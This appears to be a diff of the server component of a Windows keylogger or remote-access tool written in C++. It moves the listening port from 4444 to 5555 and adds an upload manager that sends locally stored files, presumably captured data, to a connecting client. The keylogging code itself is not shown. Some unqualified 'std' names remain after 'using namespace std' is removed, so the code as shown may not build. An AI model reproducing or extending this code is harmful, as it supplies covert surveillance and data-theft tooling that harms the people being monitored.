@@ -1,5 +1,4 @@
 #undef UNICODE
-
 #define WIN32_LEAN_AND_MEAN
 
 #include <iostream>
@@ -14,18 +13,30 @@
 #include "KeyLogger.h"
 #include "Server.h"
 #include "common/Request.h"
+#include "common/Utils.h"
+#include "common/FileUpDownloader.h"
 
-using namespace std;
-
-#define DEFAULT_PORT "4444"
+#define DEFAULT_PORT "5555"
 
 
 SOCKET ListenSocket = INVALID_SOCKET;
 atomic_bool stopServer;
 
+void closeClientSocket(SOCKET ClientSocket) {
+    int iResult = shutdown(ClientSocket, SD_SEND);
+    if (iResult == SOCKET_ERROR) {
+        printf("shutdown failed with error: %d\n", WSAGetLastError());
+        closesocket(ClientSocket);
+        WSACleanup();
+        return;
+    }
+
+    // Close client socket
+    closesocket(ClientSocket);
+}
+
 // TODO NOTIFY ON ERROR
 int server() {
-    WSADATA wsaData;
     int iResult;
 
     SOCKET ClientSocket = INVALID_SOCKET;
@@ -34,13 +45,6 @@ int server() {
     struct addrinfo hints;
 
     int iSendResult;
-    
-    // Initialize Winsock
-    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
-    if (iResult != 0) {
-        printf("WSAStartup failed with error: %d\n", iResult);
-        return 1;
-    }
 
     ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_INET;
@@ -78,7 +82,7 @@ int server() {
     freeaddrinfo(result);
 
     // Server Side
-    cout << "Server started!\n";
+    std::cout << "Server started!\n";
 
     Server server;
     unique_ptr<char[]> recvbuf(new char[8192]());
@@ -104,75 +108,63 @@ int server() {
         }
 
         // Receive request
-        int len = 0; 
-        string s; 
-        while ((iResult = recv(ClientSocket, recvbuf.get(), recvbuflen, 0)) > 0) {
-            if (iResult < 0) {
-                // NOTIFY
-                break;
-            }
-
-            len += iResult;
-            s += string(recvbuf.get(), iResult);
-        }
-    
-        // printf("Bytes received: %d\n", len);
-        // printf("Received: %s\n", recvbuf);
-        cout << "Debug: Received: " << len << " bytes\n";
-
+        PacketBuffer buffer(ClientSocket, true);
         Request request;
         Response response;
-        request.deserialize(s);
+        request.deserialize(buffer);
 
         // Process request
         server.processRequest(request, response);
 
         // Send response
-        string sendbuf = response.serialize();
-        int total = sendbuf.size();
-        len = 0;
-        while ((iResult = send(ClientSocket, sendbuf.c_str() + len, total - len, 0)) > 0) {
-           if (iResult < 0) {
-                // NOTIFY
-                cout << "Send error: " <<  WSAGetLastError() << "\n";
-                break;
+        buffer = PacketBuffer(ClientSocket, false);
+        response.serialize(buffer);
+        
+        // shutdown the connection since we're done & close.
+        closeClientSocket(ClientSocket);
+
+        /* Upload Manager */
+        Uploader uploader;
+        for (const std::pair<std::string, std::string> &pr : response.getParams()) {
+            if (!startsWith(pr.first, kFilePrefix)) {
+                continue;
+            }
+           
+            // Accept upload socket
+            ClientSocket = accept(ListenSocket, NULL, NULL);
+            if (ClientSocket == INVALID_SOCKET) {
+                printf("accept failed with error: %d\n", WSAGetLastError());
+                closesocket(ListenSocket);
+                WSACleanup();
+                return 1;
             }
 
-            len += iResult;
+            std::string filename = pr.first.substr(kFilePrefix.size());
+            cout << "DEBUG: Uploading file " << filename << "\n";
+            uploader.uploadFile(ClientSocket, filename);
+            cout << "DEBUG: Uploaded file " << filename << "\n";
         }
-
-        cout << "Debug: Sent " << len << "/" << total << " bytes\n";
-       
-        // shutdown the connection since we're done (EOF signal?)
-        iResult = shutdown(ClientSocket, SD_SEND);
-        if (iResult == SOCKET_ERROR) {
-            printf("shutdown failed with error: %d\n", WSAGetLastError());
-            closesocket(ClientSocket);
-            WSACleanup();
-            return 1;
-        }
-
-        // Close client socket
-        closesocket(ClientSocket);
+        
+        uploader.joinThread(); 
     }
 
     closesocket(ListenSocket);
 
-    // shutdown the connection since we're done
-    iResult = shutdown(ClientSocket, SD_SEND);
-    if (iResult == SOCKET_ERROR) {
-        printf("shutdown failed with error: %d\n", WSAGetLastError());
-        closesocket(ClientSocket);
-        WSACleanup();
-        return 1;
-    }
-
-    // cleanup
-    WSACleanup();
     return 0;
 }
 
 int main() {
+    WSAData wsaData;
+    // Initialize Winsock
+    int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+    if (iResult != 0) {
+        printf("WSAStartup failed with error: %d\n", iResult);
+        return 1;
+    }
+
+    // Create folder "files"
+    CreateDirectoryA("files", NULL);
+
     stopServer = false;
     thread serverThread(server);
     serverThread.join();
@@ -181,5 +173,7 @@ int main() {
         
     }
 
+    // cleanup
+    WSACleanup();
     return 0;
 }
